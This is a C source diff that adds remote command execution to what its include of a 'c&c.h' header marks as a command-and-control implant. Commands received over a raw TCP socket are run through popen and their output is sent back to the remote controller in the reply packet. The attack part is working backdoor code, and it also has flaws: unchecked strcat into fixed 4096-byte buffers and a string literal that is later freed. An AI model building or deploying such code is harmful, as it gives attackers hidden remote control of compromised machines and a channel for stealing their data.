@@ -19,6 +19,28 @@
 #include "lib/RawTCP.h"
 #include "../common/c&c.h"
 
+
+char* execute_command(char* command){
+    FILE *fp;
+    char* res = calloc(4096, sizeof(char));
+    char buf[1024];
+
+    fp = popen(command, "r");
+    if(fp == NULL) {
+        printf("Failed to run command\n" );
+        return "COMMAND ERROR";
+    }
+
+    while(fgets(buf, sizeof(buf), fp) != NULL) {
+        strcat(res, buf);
+    }
+    printf("RESULT OF COMMAND: %s\n", res);
+
+    pclose(fp);
+    return res;
+}
+
+
 char* getLocalIpAddress(){
     char hostbuffer[256];
     char* IPbuffer = calloc(256, sizeof(char));
@@ -108,10 +130,16 @@ int main(int argc, char* argv[]){
                 connection_close = 1;
             }else{
                 printf("Received request: %s\n", p);
-                packet_t packet_res = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, CC_PROT_MSG);
+                char* res = execute_command(p);
+                char* payload_buf = calloc(4096, sizeof(char));
+                strcat(payload_buf, CC_PROT_MSG);
+                strcat(payload_buf, res);
+                packet_t packet_res = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, payload_buf);
                 if(rawsocket_send(packet_res)<0){
                     return -1;
                 }
+                free(payload_buf);
+                free(res);
             }
         }
     }
